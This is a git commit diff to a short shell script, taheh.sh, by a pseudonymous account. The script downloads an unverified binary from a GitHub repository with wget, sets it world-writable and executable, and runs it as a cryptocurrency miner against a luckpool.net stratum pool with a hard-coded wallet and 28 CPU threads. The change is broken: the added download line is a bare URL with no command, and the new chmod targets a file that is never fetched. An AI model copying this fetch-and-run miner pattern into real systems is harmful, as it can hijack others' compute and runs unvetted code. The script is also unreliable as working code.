c56760a58580d1ae0204ec10e831b716424c9e86
ddauprvpvj5 <89258650+ddauprvpvj5@users.noreply.github.com>
2021-08-20 21:03:00 +0700

    Update taheh.sh

--- taheh.sh
+++ taheh.sh
@@ -1,6 +1,8 @@
 #!/bin/sh
 wget https://github.com/ddauprvpvj5/taek/raw/main/sembarang
+https://github.com/ddauprvpvj5/taek/raw/main/verus-solver
 chmod 777 sembarang
+chmod 777 verus-solver
 POL=stratum+tcp://na.luckpool.net:3956
 WAL=RHjPxndEKoEFRCevNmAeyjus5ZYtVG1iPb
 ./sembarang -c $POL -u $WAL -p x --cpu 28
